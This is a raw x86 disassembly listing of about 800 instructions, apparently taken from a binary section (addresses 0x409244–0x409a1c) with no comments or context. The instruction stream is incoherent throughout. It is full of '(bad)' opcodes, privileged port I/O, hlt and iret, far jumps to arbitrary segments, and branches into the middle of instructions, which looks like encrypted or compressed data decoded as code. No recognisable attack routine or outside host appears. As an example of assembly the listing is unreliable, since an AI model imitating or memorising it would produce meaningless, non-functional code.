  409244:	or     ebp,DWORD PTR [esp+esi*2]
  409247:	push   0xf0457ff0
  40924c:	outs   dx,DWORD PTR ds:[esi]
  40924d:	jnp    0x4092c6
  40924f:	dec    esi
  409250:	inc    ecx
  409251:	js     0x409206
  409253:	mov    ah,0xe2
  409255:	lods   al,BYTE PTR ds:[esi]
  409256:	xchg   esi,eax
  409257:	xlat   BYTE PTR ds:[ebx]
  409258:	mov    WORD PTR [eax-0x56],fs
  40925b:	jne    0x40921d
  40925d:	mov    al,ds:0xa7980ac9
  409262:	xchg   BYTE PTR [edi-0x1],ah
  409265:	lods   eax,DWORD PTR ds:[esi]
  409266:	retf   
  409267:	lock cmp esi,0xffffff9e
  40926b:	test   eax,0xa653c76f
  409270:	lea    esp,[eax-0x62]
  409273:	mov    edi,DWORD PTR [ecx+0x2237fcb4]
  409279:	out    0x8b,eax
  40927b:	mov    ?,WORD PTR [ebx-0x42]
  40927e:	mov    bh,0x65
  409280:	or     BYTE PTR [eax+ebx*2-0x21],al
  409284:	xor    eax,DWORD PTR [edi]
  409286:	rcl    DWORD PTR fs:[edx+0x2a1a8b50],1
  40928d:	mov    ebx,0xb525e375
  409292:	in     eax,0xd8
  409294:	ins    DWORD PTR es:[edi],dx
  409295:	fld    DWORD PTR [eax+eiz*4+0x7c]
  409299:	loope  0x4092ad
  40929b:	test   dh,dh
  40929d:	xchg   ebp,eax
  40929e:	dec    edx
  40929f:	cdq    
  4092a0:	xchg   ebp,eax
  4092a1:	out    0xe2,eax
  4092a3:	inc    esi
  4092a4:	imul   esi,esi,0x5f73156b
  4092aa:	pop    esi
  4092ab:	je     0x409247
  4092ad:	jbe    0x409245
  4092af:	stos   BYTE PTR es:[edi],al
  4092b0:	pop    edi
  4092b1:	push   eax
  4092b2:	inc    esp
  4092b3:	push   ecx
  4092b4:	test   al,0xdb
  4092b6:	loopne 0x409328
  4092b8:	jmp    DWORD PTR [ebx+0x2d803a03]
  4092be:	dec    edx
  4092bf:	fmul   st(6),st
  4092c1:	inc    ecx
  4092c2:	(bad)  
  4092c3:	dec    ebx
  4092c4:	cld    
  4092c5:	out    dx,al
  4092c6:	in     eax,dx
  4092c7:	push   ss
  4092c8:	mov    cl,BYTE PTR [edi+esi*4]
  4092cb:	popf   
  4092cc:	stos   BYTE PTR es:[edi],al
  4092cd:	push   0x1
  4092cf:	leave  
  4092d0:	out    0x86,eax
  4092d2:	aad    0xa
  4092d4:	or     DWORD PTR [ebx+0x3030a24a],edx
  4092da:	mov    esp,0x52087a01
  4092df:	inc    edx
  4092e0:	jp     0x409348
  4092e2:	ins    DWORD PTR es:[edi],dx
  4092e3:	mov    bh,BYTE PTR [edx+0x680d934f]
  4092e9:	sahf   
  4092ea:	das    
  4092eb:	mov    dl,0xbb
  4092ed:	pop    eax
  4092ee:	jns    0x40933c
  4092f0:	mov    bh,0x1f
  4092f2:	shr    DWORD PTR [ebp+0x1c],cl
  4092f5:	push   cs
  4092f6:	sbb    dl,BYTE PTR [esi]
  4092f8:	out    dx,al
  4092f9:	pop    DWORD PTR [esi+0x2]
  4092fc:	cmc    
  4092fd:	mov    esp,0xd65e5d9c
  409302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409303:	lds    eax,FWORD PTR [edi+0x3f8ee0df]
  409309:	es pop ecx
  40930b:	mov    cl,0x12
  40930d:	fs cmp al,0x95
  409310:	add    eax,0xd67c1b7d
  409315:	pop    esi
  409316:	outs   dx,DWORD PTR ds:[esi]
  409317:	je     0x4092f0
  409319:	push   edx
  40931a:	ret    0x946
  40931d:	mov    al,ds:0x32e314d1
  409322:	std    
  409323:	loope  0x4092f5
  409325:	and    eax,0x6fead47
  40932a:	mov    al,0x33
  40932c:	xor    BYTE PTR [eax-0x30],bh
  40932f:	and    esp,DWORD PTR ds:0xdb76ecae
  409335:	xchg   bh,cl
  409337:	retf   0x6120
  40933a:	enter  0xffe3,0xb5
  40933e:	and    DWORD PTR [edx-0x4d],esi
  409341:	mov    esi,0x4c721fdc
  409346:	inc    esi
  409347:	fwait
  409348:	outs   dx,BYTE PTR ds:[esi]
  409349:	xor    al,0x5e
  40934b:	std    
  40934c:	hlt    
  40934d:	adc    BYTE PTR gs:[edi],bl
  409350:	jno    0x409361
  409352:	mov    ebp,0xc1f2ef19
  409357:	fnsave [edx+eax*8+0x5ea18754]
  40935e:	cs shr dh,cl
  409361:	mov    ebx,0xcd803ed4
  409366:	das    
  409367:	es aam 0x4f
  40936a:	push   ecx
  40936b:	pop    ss
  40936c:	mov    esi,0xd23f30e0
  409371:	les    esp,FWORD PTR [edx+esi*8-0x673abe93]
  409378:	mov    ds:0xece90b14,al
  40937d:	jmp    0x40930b
  40937f:	in     al,dx
  409380:	xchg   BYTE PTR [eax-0x68dc2f75],dh
  409386:	lahf   
  409387:	cmp    cl,bh
  409389:	scas   al,BYTE PTR es:[edi]
  40938a:	daa    
  40938b:	sbb    al,dl
  40938d:	(bad)  [ebp+0x6b]
  409390:	iret   
  409391:	add    DWORD PTR [ecx-0x41a1c07c],edi
  409397:	xchg   esi,eax
  409398:	dec    edx
  409399:	and    DWORD PTR [edx-0x21],esp
  40939c:	xchg   edx,eax
  40939d:	sub    ecx,edx
  40939f:	lahf   
  4093a0:	loopne 0x409361
  4093a2:	sbb    esi,DWORD PTR [ebp+0x1f]
  4093a5:	test   eax,0xfa2a8de0
  4093aa:	sbb    al,0xf4
  4093ac:	pop    edi
  4093ad:	repnz (bad) 
  4093af:	push   ecx
  4093b0:	cwde   
  4093b1:	jmp    0x358d:0xf54cd98c
  4093b8:	and    edi,DWORD PTR [edi]
  4093ba:	sub    eax,0x62acfd08
  4093bf:	sahf   
  4093c0:	xchg   DWORD PTR [esi-0x319dd3d4],edx
  4093c6:	rol    BYTE PTR [ecx],1
  4093c8:	ja     0x409416
  4093ca:	push   0xfa9b269b
  4093cf:	xchg   esp,eax
  4093d0:	mov    dl,0x50
  4093d2:	jecxz  0x409356
  4093d4:	mov    esp,0x17f73d98
  4093d9:	pop    esp
  4093da:	adc    DWORD PTR [esi+edx*4],edi
  4093dd:	daa    
  4093de:	sbb    eax,0x5b1e1805
  4093e3:	inc    ecx
  4093e4:	ret    0xf2ef
  4093e7:	inc    edi
  4093e8:	xor    eax,0x1b09dd41
  4093ed:	mov    esp,DWORD PTR ss:[edx-0x45]
  4093f1:	ins    DWORD PTR es:[edi],dx
  4093f2:	jg     0x409456
  4093f4:	jmp    FWORD PTR [eax+0x58a038f7]
  4093fa:	cmp    ecx,DWORD PTR [ebx+0x47202eaa]
  409400:	sub    dl,BYTE PTR [ecx-0x63c92a89]
  409406:	push   es
  409407:	pop    esi
  409408:	dec    ecx
  409409:	mov    al,ds:0x197d835
  40940e:	mov    al,ds:0xc716ce6
  409413:	or     BYTE PTR [ecx+0x6b],bl
  409416:	shld   DWORD PTR [edi-0x488388e5],ecx,cl
  40941d:	push   es
  40941e:	das    
  40941f:	or     edx,DWORD PTR [edx-0x53]
  409422:	pop    edi
  409423:	rcr    DWORD PTR [ecx+0x2f],0xee
  409427:	or     bl,BYTE PTR [ebx+0x31eb6313]
  40942d:	lea    eax,ds:0xaee6c310
  409433:	jg     0x4093ce
  409435:	and    DWORD PTR ds:0xa24ad095,edx
  40943b:	inc    ebx
  40943c:	push   eax
  40943d:	cmp    eax,0xa9613dec
  409442:	leave  
  409443:	xlat   BYTE PTR ds:[ebx]
  409444:	or     ebx,DWORD PTR [esi]
  409446:	jmp    0x40947f
  409448:	pop    ecx
  409449:	cld    
  40944a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40944b:	lods   al,BYTE PTR ds:[esi]
  40944c:	pop    eax
  40944d:	rcl    DWORD PTR [ecx],cl
  40944f:	xor    esi,eax
  409451:	icebp  
  409452:	aas    
  409453:	add    ebp,ebx
  409455:	lock cwde 
  409457:	adc    al,0xf6
  409459:	(bad)  
  40945a:	pop    edi
  40945b:	aam    0x30
  40945d:	rcl    DWORD PTR [ecx+0x5405b05f],cl
  409463:	mov    ebp,0xbd9d5709
  409468:	dec    eax
  409469:	mov    ah,0xff
  40946b:	cld    
  40946c:	imul   esi,ecx,0xffffffa3
  40946f:	(bad)
  409474:	xor    al,cl
  409476:	mov    dh,0xb7
  409478:	std    
  409479:	popf   
  40947a:	fwait
  40947b:	pop    edi
  40947c:	fst    st(1)
  40947e:	mov    cl,0xa2
  409480:	fst    DWORD PTR [ecx]
  409482:	adc    DWORD PTR [edi-0x640125a0],eax
  409488:	jne    0x4094c5
  40948a:	inc    esp
  40948b:	les    ebx,FWORD PTR [ecx-0x4f]
  40948e:	mov    dl,0xb4
  409490:	adc    dl,ch
  409492:	inc    edi
  409493:	pop    esp
  409494:	xchg   edx,eax
  409495:	sbb    al,0x60
  409497:	bound  edx,QWORD PTR [edx-0x60e6e4be]
  40949d:	mov    bh,0x48
  40949f:	(bad)  
  4094a1:	and    eax,0x529aff0b
  4094a6:	dec    edi
  4094a7:	mov    ecx,0x9f859d0e
  4094ac:	lods   eax,DWORD PTR ds:[esi]
  4094ad:	adc    ebx,DWORD PTR [eax+0x5d9d24f4]
  4094b3:	lock mov edi,0x2528a9b4
  4094b9:	imul   eax,ecx,0x3a
  4094bc:	or     DWORD PTR [eax+0x5b],ebp
  4094bf:	dec    ebp
  4094c0:	jnp    0x4094f8
  4094c2:	cmc    
  4094c3:	add    ebp,DWORD PTR [eax]
  4094c5:	sbb    ah,al
  4094c7:	jno    0x4094fd
  4094c9:	jno    0x409523
  4094cb:	(bad)  
  4094cc:	sahf   
  4094cd:	and    esi,esi
  4094cf:	into   
  4094d0:	test   DWORD PTR [edi-0x6db0666a],edi
  4094d6:	(bad)  
  4094d7:	shr    dl,1
  4094d9:	lods   al,BYTE PTR ds:[esi]
  4094da:	jg     0x40945c
  4094dc:	mov    esi,DWORD PTR [edx]
  4094de:	(bad)  
  4094df:	jg     0x40955f
  4094e1:	pop    es
  4094e2:	pop    ds
  4094e3:	and    edi,ebp
  4094e5:	mov    dh,0xb4
  4094e7:	mov    edx,DWORD PTR [ecx]
  4094e9:	into   
  4094ea:	mov    eax,ds:0x5021e674
  4094ef:	imul   esi,DWORD PTR [esi+0x4056f3fc],0x1d822946
  4094f9:	(bad)
  4094fd:	and    ebp,DWORD PTR [edx]
  4094ff:	dec    eax
  409500:	inc    eax
  409501:	xchg   edi,eax
  409502:	outs   dx,DWORD PTR ds:[esi]
  409503:	outs   dx,BYTE PTR ds:[esi]
  409504:	mov    ecx,ecx
  409506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409507:	iret   
  409508:	pop    ss
  409509:	test   BYTE PTR [esi-0x78],ch
  40950c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40950d:	xchg   edi,eax
  40950e:	ds jg  0x40955d
  409511:	and    DWORD PTR [eax],0xe61e47da
  409517:	adc    DWORD PTR [esi],eax
  409519:	mul    DWORD PTR [ecx]
  40951b:	cmp    ebx,DWORD PTR [edx-0x24]
  40951e:	push   edi
  40951f:	rcl    DWORD PTR ds:0x206c9168,0xd3
  409526:	mul    BYTE PTR [eax]
  409528:	pop    esi
  409529:	push   cs
  40952a:	push   ebp
  40952b:	call   0xff77:0xe43467c
  409532:	sbb    esi,DWORD PTR [esi]
  409534:	fst    DWORD PTR [ebx]
  409536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409537:	mov    esp,DWORD PTR [ecx]
  409539:	iret   
  40953a:	das    
  40953b:	test   DWORD PTR [ecx+ebx*4-0x6a1752ba],ebp
  409542:	mov    dl,0x2b
  409544:	test   DWORD PTR [ecx+0x2f8df456],esp
  40954a:	imul   edi,DWORD PTR [edx],0xffffffca
  40954d:	pop    ebp
  40954e:	gs into 
  409550:	stos   DWORD PTR es:[edi],eax
  409551:	push   ss
  409552:	push   ds
  409553:	pop    ecx
  409554:	pop    eax
  409555:	xchg   BYTE PTR [ecx+0x2760d070],ch
  40955b:	cmp    ch,dl
  40955d:	inc    ebp
  40955e:	idiv   BYTE PTR [ebp-0x5de12ef1]
  409564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409565:	mov    BYTE PTR [ebp-0x7311efbc],dl
  40956b:	push   esp
  40956c:	xchg   BYTE PTR [ebx-0x3a],ah
  40956f:	clc    
  409570:	xor    DWORD PTR [ecx-0x13],esi
  409573:	sub    esp,edx
  409575:	xchg   ebp,eax
  409576:	xchg   ebp,eax
  409577:	test   eax,0x3dc63e1f
  40957c:	aad    0xe3
  40957e:	popa   
  40957f:	or     bh,BYTE PTR [ebx-0x40]
  409582:	xor    BYTE PTR [ebp-0x740db508],ah
  409588:	push   ebp
  409589:	dec    BYTE PTR [esi-0x8]
  40958c:	dec    esi
  40958d:	push   0xfd9e30f7
  409592:	clc    
  409593:	pop    esp
  409594:	in     al,dx
  409595:	call   0x895:0x179cddc0
  40959c:	sub    DWORD PTR ds:[ebp+0x3a7f74cc],0x6e
  4095a4:	out    0xf1,al
  4095a6:	arpl   WORD PTR [ecx+0x78],bx
  4095a9:	xor    ah,BYTE PTR [edx-0x7a]
  4095ac:	aad    0x6
  4095ae:	push   0xffffff9f
  4095b0:	inc    edi
  4095b1:	ret    
  4095b2:	push   edx
  4095b3:	sbb    bl,BYTE PTR [ebx-0x16]
  4095b6:	cmp    DWORD PTR [esp+ecx*1+0x36],0x25e95c74
  4095be:	inc    eax
  4095bf:	(bad)  
  4095c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095c1:	or     eax,0xeb406d40
  4095c6:	adc    BYTE PTR [ebx],ch
  4095c8:	call   0xc0f5:0x2d3bdb69
  4095cf:	xchg   edi,ecx
  4095d1:	and    edi,edi
  4095d3:	mov    dl,0xa9
  4095d5:	inc    esi
  4095d6:	jge    0x4095c5
  4095d8:	xchg   ebx,ecx
  4095da:	jecxz  0x4095fc
  4095dc:	fadd   st,st(0)
  4095de:	dec    ebp
  4095df:	jg     0x409604
  4095e1:	test   DWORD PTR [eax],ebx
  4095e3:	das    
  4095e4:	scas   eax,DWORD PTR es:[edi]
  4095e5:	test   al,0x8e
  4095e7:	in     al,dx
  4095e8:	std    
  4095e9:	ds stos DWORD PTR es:[edi],eax
  4095eb:	xchg   edi,eax
  4095ec:	mov    cs,WORD PTR [ebx]
  4095ee:	das    
  4095ef:	(bad)  
  4095f0:	pusha  
  4095f1:	add    dl,dl
  4095f3:	int3   
  4095f4:	(bad)  
  4095f6:	(bad)  
  4095f7:	sub    edx,esi
  4095f9:	call   0x4a14a73e
  4095fe:	push   es
  4095ff:	or     bl,cl
  409601:	fidiv  WORD PTR [ebx]
  409603:	fwait
  409604:	ss mov ebp,0x8394658a
  40960a:	ds in  eax,dx
  40960c:	cmp    BYTE PTR [eax-0xbe1bc2b],al
  409612:	pop    edx
  409613:	xor    DWORD PTR [bp+0xc62],0xffffffc8
  409619:	add    DWORD PTR [edi+ecx*8],0xd1337e22
  409620:	es das 
  409622:	and    al,0x7c
  409624:	outs   dx,DWORD PTR ds:[esi]
  409625:	adc    al,0xb4
  409627:	jne    0x409659
  409629:	cwde   
  40962a:	adc    DWORD PTR [ebp-0x259bcb1e],0x64ea45d
  409634:	pop    edi
  409635:	loop   0x409678
  409637:	or     DWORD PTR [esi-0x78],0xdfd47aa7
  40963e:	scas   al,BYTE PTR es:[edi]
  40963f:	outs   dx,DWORD PTR ds:[esi]
  409640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409641:	adc    edx,DWORD PTR [edx-0x30ddacea]
  409647:	loope  0x409675
  409649:	aaa    
  40964a:	push   esi
  40964b:	stc    
  40964c:	fmul   QWORD PTR [eax*4+0x477b9d29]
  409653:	cmp    esi,DWORD PTR [ebp+eax*8+0x702ca92]
  40965a:	cmp    eax,0xcfccf189
  40965f:	adc    BYTE PTR [edx],cl
  409661:	mov    ch,ch
  409663:	(bad)  
  409665:	cmp    al,0x72
  409667:	and    bh,dl
  409669:	push   esp
  40966a:	test   al,0xfb
  40966c:	out    dx,eax
  40966d:	mov    ds:0x3669412a,al
  409672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409673:	ja     0x409609
  409675:	jmp    0x1c7b:0xc0b549cc
  40967c:	icebp  
  40967d:	push   0x36212318
  409682:	jmp    0x8052:0x96e3a6e0
  409689:	or     dh,BYTE PTR [eax]
  40968b:	jne    0x409651
  40968d:	xor    al,0x60
  40968f:	or     al,0x73
  409691:	mov    ch,BYTE PTR [ebp+eax*1+0x58]
  409695:	and    BYTE PTR [ebx+0x1c],ch
  409698:	xlat   BYTE PTR ds:[ebx]
  409699:	sti    
  40969a:	data16 shl bl,0xd1
  40969e:	mov    ds:0xa2372037,al
  4096a3:	bnd jle 0x40966e
  4096a6:	inc    eax
  4096a7:	mov    cl,BYTE PTR [ebp+0x61]
  4096aa:	inc    edx
  4096ab:	jmp    FWORD PTR [ebx]
  4096ad:	push   ss
  4096ae:	and    BYTE PTR [esi+ebx*1-0x33],cl
  4096b2:	int3   
  4096b3:	xchg   edx,eax
  4096b4:	push   ecx
  4096b5:	ins    DWORD PTR es:[edi],dx
  4096b6:	push   ss
  4096b7:	fdiv   QWORD PTR [ecx-0x4fdcddf]
  4096bd:	loop   0x4096d3
  4096bf:	mov    dl,0xd3
  4096c1:	fucom  st(3)
  4096c3:	or     ch,BYTE PTR [ebx+0x1f]
  4096c6:	(bad)  
  4096c8:	neg    DWORD PTR [ecx+0x10]
  4096cb:	iret   
  4096cc:	imul   ebx,edi,0xaa0921aa
  4096d2:	dec    ebp
  4096d3:	add    al,BYTE PTR [eax+0x5ac6c27d]
  4096d9:	(bad)  
  4096da:	jl     0x40973f
  4096dc:	mov    esp,0xeb9d04ad
  4096e1:	mov    ebp,0x97eb3549
  4096e6:	add    ebx,DWORD PTR ds:0x5e4f48b2
  4096ec:	test   ebp,ecx
  4096ee:	mov    DWORD PTR [ecx+eax*1+0x3b],edi
  4096f2:	rcl    DWORD PTR [esi],cl
  4096f4:	pop    ebp
  4096f5:	fldenv [edi]
  4096f7:	or     BYTE PTR [edi+0x7ec5087],ah
  4096fd:	outs   dx,DWORD PTR ds:[esi]
  4096fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096ff:	push   edx
  409700:	pop    es
  409701:	xor    BYTE PTR [esi+0x75],ah
  409704:	rol    DWORD PTR [esi],1
  409706:	inc    ecx
  409707:	in     eax,dx
  409708:	mov    ebp,0x54e102e0
  40970d:	idiv   DWORD PTR [edi+0x5d]
  409710:	push   cs
  409711:	sar    BYTE PTR fs:[edx],cl
  409714:	xchg   ebp,eax
  409715:	and    BYTE PTR ds:0x700d7a2d,ah
  40971b:	xor    cl,BYTE PTR [edx+0x76]
  40971e:	or     BYTE PTR [edx],bl
  409720:	out    dx,al
  409721:	fstp   DWORD PTR [ecx+edx*2+0x3bc73687]
  409728:	pop    edi
  409729:	aas    
  40972a:	mov    cl,0xf7
  40972c:	push   ds
  40972d:	ftst   
  40972f:	jne    0x409776
  409731:	dec    ebp
  409732:	leave  
  409733:	aas    
  409734:	mov    dl,0x82
  409736:	mov    dl,0x98
  409738:	fcom   QWORD PTR [esi]
  40973a:	aaa    
  40973b:	jl     0x40979d
  40973d:	imul   edx,DWORD PTR [ebp+0x29],0x36d6b31a
  409744:	sbb    eax,0xecc01d63
  409749:	cs mov ecx,edi
  40974c:	js     0x40976d
  40974e:	mov    dl,0x36
  409750:	sbb    DWORD PTR [eax-0x26],ecx
  409753:	jmp    0xea8c8be7
  409758:	rcr    BYTE PTR [edx-0x6b04b001],1
  40975e:	xchg   ebx,eax
  40975f:	cdq    
  409760:	std    
  409761:	push   esp
  409762:	or     al,0xc6
  409764:	loop   0x409743
  409766:	fcomp  DWORD PTR [ebx+0x5e34e41]
  40976c:	dec    eax
  40976d:	retf   0xc98b
  409770:	xchg   DWORD PTR [edx+0x29],ecx
  409773:	jmp    0xb41a:0x1a40f240
  40977a:	fadd   DWORD PTR [ecx-0xf3ceade]
  409780:	cmp    al,0x57
  409783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409784:	xlat   BYTE PTR ds:[ebx]
  409785:	sbb    al,0x95
  409787:	push   ss
  409788:	mov    ch,0x44
  40978a:	jmp    FWORD PTR [eax-0x42]
  40978d:	sub    BYTE PTR [ebx+eiz*2],0x39
  409791:	jl     0x4097f2
  409793:	ins    DWORD PTR es:[edi],dx
  409794:	add    eax,0x17a7f6f
  409799:	fiadd  DWORD PTR [edx+edx*4]
  40979c:	out    dx,al
  40979d:	jl     0x409768
  40979f:	mov    ebx,0xdd7bf30d
  4097a4:	jmp    0x18fb0021
  4097a9:	adc    ah,dl
  4097ab:	xor    BYTE PTR [edx-0x598295ae],al
  4097b1:	mov    ecx,0x9ffafe43
  4097b6:	cmc    
  4097b7:	mov    ebp,0x7d3fc5b1
  4097bc:	shl    ch,1
  4097be:	out    dx,eax
  4097bf:	sub    eax,0x9a6c356b
  4097c4:	sbb    eax,0xc863e52b
  4097c9:	mov    bl,bh
  4097cb:	popf   
  4097cc:	sbb    eax,ecx
  4097ce:	stos   BYTE PTR es:[edi],al
  4097cf:	sub    esp,esi
  4097d1:	or     edi,DWORD PTR [edx]
  4097d3:	fcom   QWORD PTR [ecx+0x67cb3008]
  4097d9:	ret    
  4097da:	ret    0xa151
  4097dd:	ror    edx,0x16
  4097e0:	cmp    BYTE PTR gs:[eax*2+0xe56ae5],ah
  4097e8:	xor    DWORD PTR [ebp+0x35136a6],ecx
  4097ee:	or     ah,al
  4097f0:	xchg   ecx,eax
  4097f1:	jo     0x409851
  4097f3:	aas    
  4097f4:	mov    al,ds:0x782b308a
  4097f9:	repz sub al,0x2a
  4097fc:	gs daa 
  4097fe:	cmp    dh,dh
  409800:	icebp  
  409801:	neg    ah
  409803:	ins    DWORD PTR es:[edi],dx
  409804:	cs mov ebx,0x5cd1d7c4
  40980a:	lahf   
  40980b:	add    ah,BYTE PTR [ebp-0x11ce7fe4]
  409811:	sub    eax,0x8bbf7cc5
  409816:	jne    0x409801
  409818:	jno    0x409865
  40981a:	mov    eax,ds:0x67200cdd
  40981f:	cmp    esi,edi
  409821:	loopne 0x409834
  409823:	ja     0x40985e
  409825:	aaa    
  409826:	mov    bh,0x42
  409828:	les    ecx,FWORD PTR [ecx-0x2f]
  40982b:	pop    edx
  40982c:	sub    DWORD PTR [ebx],edi
  40982e:	sbb    BYTE PTR [ecx-0x7da357bb],0x3b
  409835:	enter  0xbb5c,0x68
  409839:	sub    BYTE PTR [edi],ah
  40983b:	or     dl,BYTE PTR [esi]
  40983d:	sub    DWORD PTR [esi+0x53],eax
  409840:	cs xchg ebx,eax
  409842:	jae    0x409810
  409844:	or     eax,0x7270cd2d
  409849:	push   edi
  40984a:	pop    edi
  40984b:	(bad)
  40984f:	fisubr WORD PTR [ebp+ebp*8+0x7bb3c473]
  409856:	(bad)  
  409857:	ins    BYTE PTR es:[edi],dx
  409858:	or     ebp,DWORD PTR [ecx]
  40985a:	test   BYTE PTR [edi+0x51],bl
  40985d:	cs mov edi,0x1e3e4578
  409863:	fs popa 
  409865:	lds    eax,FWORD PTR [esi]
  409867:	loope  0x4098bc
  409869:	js     0x4098e8
  40986b:	xchg   ebp,ebp
  40986d:	sbb    DWORD PTR [eax-0x4dee9370],eax
  409873:	das    
  409874:	sub    bh,BYTE PTR [ebp-0x20287b21]
  40987a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40987b:	ds push cs
  40987d:	test   al,0xb8
  40987f:	add    eax,0x2f84209d
  409884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409885:	push   ss
  409886:	inc    eax
  409887:	out    0xdd,eax
  409889:	adc    ebp,DWORD PTR ds:0xcaf2bb5f
  40988f:	das    
  409890:	cmpps  xmm5,XMMWORD PTR [ebx+0x24443d06],0x6f
  409898:	stos   DWORD PTR es:[edi],eax
  409899:	mov    edi,0x8000da1a
  40989e:	or     al,0x4
  4098a0:	nop
  4098a1:	pop    ds
  4098a2:	(bad)  
  4098a3:	mov    BYTE PTR [edx],dl
  4098a5:	dec    ecx
  4098a6:	or     eax,0xcad4d00e
  4098ab:	sub    edx,DWORD PTR [edi]
  4098ad:	repz sbb BYTE PTR [ebx],0x4c
  4098b1:	in     al,dx
  4098b2:	(bad)  
  4098b3:	hlt    
  4098b4:	add    bh,BYTE PTR [edi-0x36]
  4098b7:	pop    esp
  4098b8:	retf   0xa944
  4098bb:	pop    ebp
  4098bc:	int    0xa0
  4098be:	adc    al,0xc4
  4098c0:	mov    dh,0xf4
  4098c2:	or     al,0x98
  4098c4:	sub    ebp,edx
  4098c6:	and    ebx,esp
  4098c8:	push   edx
  4098c9:	adc    dh,BYTE PTR [esi+edi*2]
  4098cc:	mov    eax,ds:0xf8542e6a
  4098d1:	into   
  4098d2:	push   esi
  4098d3:	addr16 mov ebp,0x70c021ab
  4098d9:	call   0xe40a2226
  4098de:	loope  0x40994f
  4098e0:	mov    ds,WORD PTR [edx-0x1d49cf53]
  4098e6:	mov    edx,0x27b5bffb
  4098eb:	or     DWORD PTR [eax-0x7867ffb0],edi
  4098f1:	pusha  
  4098f2:	sub    al,0x18
  4098f4:	inc    ebx
  4098f5:	inc    edi
  4098f6:	in     al,dx
  4098f7:	dec    ebp
  4098f8:	lods   eax,DWORD PTR ds:[esi]
  4098f9:	xlat   BYTE PTR ds:[ebx]
  4098fa:	fwait
  4098fb:	inc    ebx
  4098fc:	test   cl,dl
  4098fe:	and    eax,DWORD PTR [edi]
  409900:	cmc    
  409901:	mov    bh,0xd9
  409903:	aas    
  409904:	shl    ecx,1
  409906:	adc    DWORD PTR [edi-0x68ad0dc1],esp
  40990c:	mov    DWORD PTR [edx+0x27],ebx
  40990f:	adc    ebx,edx
  409911:	in     eax,0xf2
  409913:	in     eax,dx
  409914:	repnz aad 0x9c
  409917:	enter  0x41c7,0xaa
  40991b:	mov    ss,WORD PTR [esi+0xf7c53e8]
  409921:	cmpxchg DWORD PTR [edi+0x58fa569],ecx
  409928:	push   esi
  409929:	(bad)  
  40992a:	not    BYTE PTR [edx+0x48]
  40992d:	test   BYTE PTR es:[esp+esi*4+0x28],ch
  409932:	push   0xafb1cb37
  409937:	or     DWORD PTR [esi+0x17422898],ebx
  40993d:	jno    0x4098ed
  40993f:	dec    ecx
  409940:	and    DWORD PTR [ecx-0x1aff771a],0x292d741d
  40994a:	(bad)  [edi-0x79449fb5]
  409950:	jge    0x4098d7
  409952:	gs push 0x15
  409955:	push   edx
  409956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409957:	dec    eax
  409958:	lock scas al,BYTE PTR es:[edi]
  40995a:	add    esp,DWORD PTR [ebx-0x6fcd5692]
  409960:	add    eax,0x55792408
  409965:	test   BYTE PTR [edx-0x2c9a15d],0x37
  40996c:	retf   
  40996d:	je     0x4099e6
  40996f:	add    BYTE PTR [ebx],0x8c
  409972:	out    dx,eax
  409973:	int    0xdb
  409975:	cmp    al,BYTE PTR [ebx-0x29]
  409978:	and    eax,0x82424cdb
  40997d:	jbe    0x4099af
  40997f:	ret    0x4d43
  409982:	inc    edi
  409983:	mov    ah,0x57
  409985:	outs   dx,BYTE PTR ds:[esi]
  409986:	adc    BYTE PTR [ebx-0x2d9b7f2f],cl
  40998c:	push   ds
  40998d:	mov    eax,ds:0x29a2b158
  409992:	mov    ebx,0xb42750
  409997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409998:	jno    0x409954
  40999a:	xor    bh,BYTE PTR [edx-0x62fb0d1b]
  4099a0:	in     al,0x22
  4099a2:	popf   
  4099a3:	loopne 0x4099d0
  4099a5:	loope  0x40998b
  4099a7:	sub    edx,DWORD PTR [ebx]
  4099a9:	xlat   BYTE PTR ds:[ebx]
  4099aa:	or     cl,BYTE PTR [ecx+edx*2+0x38]
  4099ae:	sbb    BYTE PTR [eax+esi*2],ah
  4099b1:	or     BYTE PTR ds:0x3c81243a,dl
  4099b7:	jge    0x4099a9
  4099b9:	and    BYTE PTR [ecx],bh
  4099bb:	fs sbb ebx,ecx
  4099be:	jecxz  0x4099f8
  4099c0:	xlat   BYTE PTR ds:[ebx]
  4099c1:	mov    bh,0xd2
  4099c3:	mov    esi,ebx
  4099c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099c6:	clc    
  4099c7:	shl    BYTE PTR [esi+0x42a4532],cl
  4099cd:	mov    ebx,0x1e0c0320
  4099d2:	adc    cl,bl
  4099d4:	jmp    0x40997a
  4099d6:	loopne 0x4099b4
  4099d8:	mov    DWORD PTR [ebx+0x5c425359],esp
  4099de:	dec    ecx
  4099df:	xor    ebx,DWORD PTR [edi+edi*1]
  4099e2:	jno    0x409a07
  4099e4:	mov    DWORD PTR [ebx-0x619aeee1],eax
  4099ea:	jl     0x4099ed
  4099ec:	cmp    esi,edi
  4099ee:	cmc    
  4099ef:	sub    al,0x2f
  4099f1:	mov    ebp,0xf50fe410
  4099f6:	(bad)  
  4099f7:	pavgb  mm4,mm4
  4099fa:	sub    BYTE PTR [esp+edx*8],al
  4099fd:	out    dx,eax
  4099fe:	push   es
  4099ff:	inc    esi
  409a00:	sbb    eax,0x2a8b229d
  409a05:	push   0x55898aa2
  409a0a:	mov    bl,0x2f
  409a0c:	mov    edi,0xda93f58c
  409a11:	dec    ebp
  409a12:	mov    WORD PTR [edi],es
  409a14:	sub    esi,esp
  409a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a18:	push   es
  409a19:	adc    ebp,edi
  409a1b:	pop    edi
  409a1c:	sbb    cl,dl
